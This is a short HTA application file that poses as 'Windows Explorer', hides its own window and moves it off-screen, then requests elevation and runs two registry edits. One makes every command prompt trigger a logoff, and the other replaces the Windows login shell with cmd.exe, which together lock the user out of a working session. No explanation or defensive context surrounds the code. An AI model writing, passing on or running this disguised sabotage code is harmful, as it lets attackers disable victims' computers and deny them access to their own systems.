<html>
<head>
<title>Windows Explorer</title>
<HTA:APPLICATION
      ID="oHTA"
      APPLICATIONNAME="HiddenApp"
      WINDOWSTATE="minimize"
      SHOWINTASKBAR="no"
      CAPTION="no"
      BORDER="none"
      SYSMENU="no"
      MAXIMIZEBUTTON="no"
      MINIMIZEBUTTON="no"
   >
</head>
<body style="margin:0;background:white;">
<script>
      var s=new ActiveXObject('Shell.Application')
      s.ShellExecute('reg.exe','add "HKCU\\Software\\Microsoft\\Command Processor" /v AutoRun /t REG_SZ /d "logoff" /f','', 'runas',1);
      s.ShellExecute('reg.exe','add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /t REG_SZ /d "cmd.exe" /f','', 'runas',1);
      window.close()
</script>
<script>
      
</script>
<script>window.moveTo(-3000, -3000);</script>
</body>  
</html>
